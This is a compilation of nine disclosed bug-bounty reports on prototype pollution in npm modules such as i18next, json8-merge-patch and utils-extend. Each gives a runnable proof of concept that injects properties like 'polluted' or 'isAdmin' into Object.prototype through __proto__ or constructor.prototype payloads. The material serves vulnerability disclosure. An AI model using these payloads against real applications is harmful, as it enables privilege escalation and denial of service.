# Modification of Assumed-Immutable Data (MAID)

_9 reports — High/Critical, disclosed_

### [[i18next] Prototype pollution attack](https://hackerone.com/reports/968355)

- **Report ID:** `968355`
- **Severity:** High
- **Weakness:** Modification of Assumed-Immutable Data (MAID)
- **Program:** Node.js third-party modules
- **Reporter:** @0b5cur17y
- **Bounty:** - usd
- **Disclosed:** 2021-04-26T20:52:07.700Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a prototype pollution vulnerability in i18next.
It allows to modify the prototype of a base object, which may result in DoS, XSS, RCE, etc. depending on the way the library is used.

# Module

**module name:** i18next
**version:** 19.7.0
**npm page:** ` https://www.npmjs.com/package/i18next`

## Module Description

i18next is a very popular internationalization framework for browser or any other javascript environment (eg. node.js).

## Module Stats

Weekly downloads: 1,003,465

# Vulnerability

## Vulnerability Description

The i18next API provides a function `addResourceBundle` in [src/ResourceStore.js:79](https://github.com/i18next/i18next/blob/master/src/ResourceStore.js#L79) (see API docs [here](https://www.i18next.com/overview/api#addresourcebundle)).
It allows to set many translations at once. Optionally, it can process nested objects and overwrite existing translations.
For example, you can call `i18next.addResourceBundle('en', 'translations', { homepage: { title: 'The English Title'} }, true, true);` to set the key "homepage.title" to "The English Title", overwriting it if it existed before.

The function `addResourceBundle` uses a utility function `deepExtend` to process nested objects.
It is defined in [src/utils.js:84](https://github.com/i18next/i18next/blob/44c2e7621a7e07660433b27122281b50886a1caf/src/utils.js#L84).
This function attempts to guard against prototype pollution by blacklisting the property `__proto__`.
However, it does not blacklist the property `constructor`.

To pollute `Object` you could thus set a translation like `{ constructor: { prototype: { polluted: true } } }`.

For an application to be vulnerable, it has to use  `addResourceBundle` with attacker-controlled input passed into the `resources` argument.
Moreover, both arguments `deep` and `overwrite` must be set to `true`. 

## Steps To Reproduce:

To try it out quickly, you can just copy the function `deepExtend` from [src/utils.js:84](https://github.com/i18next/i18next/blob/44c2e7621a7e07660433b27122281b50886a1caf/src/utils.js#L84)
and use it to apply the above-mentioned payload  to an empty object, with the `overwrite` argument set to `true`.

The following self-contained code snipped exemplifies how to do it.
Copy and paste to a file "main.js" and run in "node main.js".
It will print "Object is polluted".

```
// -------------- deepExtend as defined in i18next -------------- 
function deepExtend(target, source, overwrite) {
  /* eslint no-restricted-syntax: 0 */
  for (const prop in source) {
    if (prop !== '__proto__') {
      if (prop in target) {
        // If we reached a leaf string in target or source then replace with source or skip depending on the 'overwrite' switch
        if (
          typeof target[prop] === 'string' ||
          target[prop] instanceof String ||
          typeof source[prop] === 'string' ||
          source[prop] instanceof String
        ) {
          if (overwrite) target[prop] = source[prop];
        } else {
          deepExtend(target[prop], source[prop], overwrite);
        }
      } else {
        target[prop] = source[prop];
      }
    }
  }
  return target;
}
// --------------------------------------------------------------- 

const translations = '{ "constructor": { "prototype": { "polluted": true} } }';  
const existingData = {};                         
                                                  
deepExtend(existingData, JSON.parse(translations), true)

if ({}.polluted)
    console.log("Object is polluted")
```

# Wrap up

Select Y or N for the following statements:

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

The vulnerability may result in DoS, XSS, RCE, etc. depending on the way the library is used.

---

### [[plain-object-merge] Prototype pollution](https://hackerone.com/reports/871156)

- **Report ID:** `871156`
- **Severity:** High
- **Weakness:** Modification of Assumed-Immutable Data (MAID)
- **Program:** Node.js third-party modules
- **Reporter:** @d3lla
- **Bounty:** - usd
- **Disclosed:** 2021-03-13T19:30:53.402Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a `prototype pollution` vulnerability in `plain-object-merge` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `plain-object-merge`
**version:** `1.0.1`
**npm page:** `https://www.npmjs.com/package/plain-object-merge`

## Module Description

Extremely fast function optimized for deep merging json-serializable plain objects.

## Module Stats

[20] weekly downloads

# Vulnerability

## Vulnerability Description

The `merge` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `plain-object-merge` module:
    - `npm i plain-object-merge`

Create an object with `__proto__` property and pass it to the `merge` function:
```javascript

const merge = require('plain-object-merge');
const payload =  JSON.parse('{"__proto__":{"polluted":"yes"}}');
const obj = {};
console.log("Before : " + obj.polluted);
merge([{}, payload]);
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F824411}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

---

### [[json8-merge-patch] Prototype Pollution](https://hackerone.com/reports/980649)

- **Report ID:** `980649`
- **Severity:** High
- **Weakness:** Modification of Assumed-Immutable Data (MAID)
- **Program:** Node.js third-party modules
- **Reporter:** @gkmr
- **Bounty:** - usd
- **Disclosed:** 2020-10-18T08:10:20.699Z
- **CVE(s):** CVE-2020-8268

**Vulnerability Information:**

I would like to report a `Prototype Pollution` vulnerability in `json8-merge-patch`
The `apply` function fails to restrict access to prototypes of objects, allowing for modification of prototype behavior.

# Module

**module name:** `json8-merge-patch`
**version:** `v1.0.1`
**npm page:** `https://www.npmjs.com/package/json8-merge-patch`

## Module Description

JSON Merge Patch RFC 7396 toolkit for JavaScript.

## Module Stats

Weekly downloads: `517`

# Vulnerability

## Vulnerability Description

The `apply` function fails to restrict access to prototypes of objects, allowing for modification of prototype behavior, which may allow obtaining sensitive information/DoS/RCE.

## Steps To Reproduce:

1. Install `json8-merge-patch` module

     > `npm i json8-merge-patch`
2. create a file `poc.js` with content :
```
let json8mergepatch = require("json8-merge-patch");
var obj = {}
console.log("Before : " + obj.isAdmin);
json8mergepatch.apply(obj, JSON.parse('{ "__proto__": { "isAdmin": true }}'));
console.log("After : " + obj.isAdmin);
```
3. Execute using: `node poc.js`

##Output:
Before: undefined
After: true

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Windows 10
- NODEJS VERSION: v12.18.3
- NPM VERSION: 6.14.6

# Wrap up

- I contacted the maintainer to let them know: [Y] 
- I opened an issue in the related repository: [Y] 

Ref: https://github.com/sonnyp/JSON8/issues/113

## Impact

Can result in sensitive information disclosure/DoS/RCE. (depends on implementation)

---

### [property-expr - Prototype pollution](https://hackerone.com/reports/910206)

- **Report ID:** `910206`
- **Severity:** High
- **Weakness:** Modification of Assumed-Immutable Data (MAID)
- **Program:** Node.js third-party modules
- **Reporter:** @ahihi
- **Bounty:** - usd
- **Disclosed:** 2020-09-24T04:00:17.873Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report Prototype pollution in property-expr
It allows attacker to modify the prototype of a base object.

# Module

**module name:** property-expr
**version:** 2.0.2
**npm page:** `https://www.npmjs.com/package/property-expr`

## Module Description

> Tiny property path utilities, including path parsing and metadata and deep property setters and getters

## Module Stats

> Replace stats below with numbers from npm’s module page:

[1,057,612] weekly downloads

# Vulnerability

## Vulnerability Description

> The functions setter can be tricked into modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Run the following code:
```
let expr = require('property-expr')
obj = {}
expr.setter('constructor.prototype.isAdmin')(obj,true)
console.log({}.isAdmin) // true
```
# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [Y/N]  N
- I opened an issue in the related repository: [Y/N] N

## Impact

Modify Object prototype can lead to Dos, RCE, change code logic flow.

---

### [[objtools] Prototype pollution](https://hackerone.com/reports/878394)

- **Report ID:** `878394`
- **Severity:** High
- **Weakness:** Modification of Assumed-Immutable Data (MAID)
- **Program:** Node.js third-party modules
- **Reporter:** @d3lla
- **Bounty:** - usd
- **Disclosed:** 2020-09-14T10:51:58.317Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a `prototype pollution` vulnerability in `objtools` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `objtools`
**version:** `2.0.1`
**npm page:** `https://www.npmjs.com/package/objtools`

## Module Description

objtools provides several utility functions for working with structured objects. Basic examples of how to use are provided below. See the docs directory for full information.

## Module Stats

[30] weekly downloads

# Vulnerability

## Vulnerability Description

The `merge` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `objtools` module:
    - `npm i objtools`

Create an object with `__proto__` property and pass it to the `merge` function:
```javascript

const objtools = require('objtools');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
let obj = {};
console.log("Before : " + obj.polluted);
objtools.merge({}, payload);
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F835153}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

---

### [[keyd] Prototype pollution](https://hackerone.com/reports/877515)

- **Report ID:** `877515`
- **Severity:** High
- **Weakness:** Modification of Assumed-Immutable Data (MAID)
- **Program:** Node.js third-party modules
- **Reporter:** @d3lla
- **Bounty:** - usd
- **Disclosed:** 2020-09-14T10:51:47.788Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a `prototype pollution` vulnerability in `keyd` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `keyd`
**version:** `1.3.4`
**npm page:** `https://www.npmjs.com/package/keyd`

## Module Description

A small library for using and manipulating key paths in JavaScript.

## Module Stats

[71] weekly downloads

# Vulnerability

## Vulnerability Description

The `set` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `keyd` module:
    - `npm i keyd`

Set the `__proto__.polluted` property of an object:
```javascript

const keyd = require('keyd');
const obj = {};
console.log("Before : " + obj.polluted);
keyd({}).set('__proto__.polluted', 'yes');
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F833532}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

---

### [[extend-merge] Prototype pollution](https://hackerone.com/reports/878339)

- **Report ID:** `878339`
- **Severity:** High
- **Weakness:** Modification of Assumed-Immutable Data (MAID)
- **Program:** Node.js third-party modules
- **Reporter:** @d3lla
- **Bounty:** - usd
- **Disclosed:** 2020-09-06T13:00:50.364Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a `prototype pollution` vulnerability in `extend-merge` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `extend-merge`
**version:** `1.0.5`
**npm page:** `https://www.npmjs.com/package/extend-merge`

## Module Description

Shallow extend and deep merge utility function.

## Module Stats

[48] weekly downloads

# Vulnerability

## Vulnerability Description

The `merge` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `extend-merge` module:
    - `npm i extend-merge`

Create an object with `__proto__` property and pass it to the `merge` function:
```javascript

const extend_merge = require('extend-merge');
const payload =  JSON.parse('{"__proto__":{"polluted":"yes"}}');
let obj = {};
console.log("Before : " + obj.polluted);
extend_merge.merge({}, payload);
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F835068}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

---

### [[object-path-set] Prototype pollution](https://hackerone.com/reports/878332)

- **Report ID:** `878332`
- **Severity:** High
- **Weakness:** Modification of Assumed-Immutable Data (MAID)
- **Program:** Node.js third-party modules
- **Reporter:** @d3lla
- **Bounty:** - usd
- **Disclosed:** 2020-08-20T09:08:31.858Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a `prototype pollution` vulnerability in `object-path-set` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `object-path-set`
**version:** `1.0.0`
**npm page:** `https://www.npmjs.com/package/object-path-set`

## Module Description

set values in javascript objects by specifying a path.
if the path doesn't exist yet, it will be created.

## Module Stats

[81] weekly downloads

# Vulnerability

## Vulnerability Description

The `setPath` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `object-path-set` module:
    - `npm i object-path-set`

Set the `__proto__.polluted` property of an object:
```javascript

const setPath = require('object-path-set');
const obj = {};
console.log("Before : " + obj.polluted);
setPath({}, '__proto__.polluted', 'yes');
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F835049}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

---

### [[utils-extend] Prototype pollution ](https://hackerone.com/reports/801522)

- **Report ID:** `801522`
- **Severity:** Critical
- **Weakness:** Modification of Assumed-Immutable Data (MAID)
- **Program:** Node.js third-party modules
- **Reporter:** @tuo4n8
- **Bounty:** - usd
- **Disclosed:** 2020-04-02T08:57:57.394Z
- **CVE(s):** CVE-2020-8147

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

I would like to report `prototype polution` in `utils-extend`
It allows an attacker to modify the prototype of a base object which can vary in severity depending on the implementation (DoS, access to sensitive data, RCE).

# Module

**module name:** utils-extend
**version:** 1.0.8
**npm page:** `https://www.npmjs.com/package/utils-extend`

## Module Description

> Extend nodejs util api, and it is light weight and simple.

## Module Stats

[1] weekly downloads : **129,956**

# Vulnerability

## Vulnerability Description

## Steps To Reproduce:

1. npm install --save utils-extend
2. create file index.js with content :

```javascript
const { extend } = require('utils-extend');
const payload = '{"__proto__":{"isAdmin":true}}'
const emptyObject = {}
const pollutionObject = JSON.parse(payload);
extend({}, pollutionObject)
console.log(emptyObject.isAdmin)  // true
```

3. run `node index.js` => true 

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [Y/N] : N
- I opened an issue in the related repository: [Y/N]  : N

## Impact

Can result in: dos, access to restricted data, rce (depends on implementation)

---
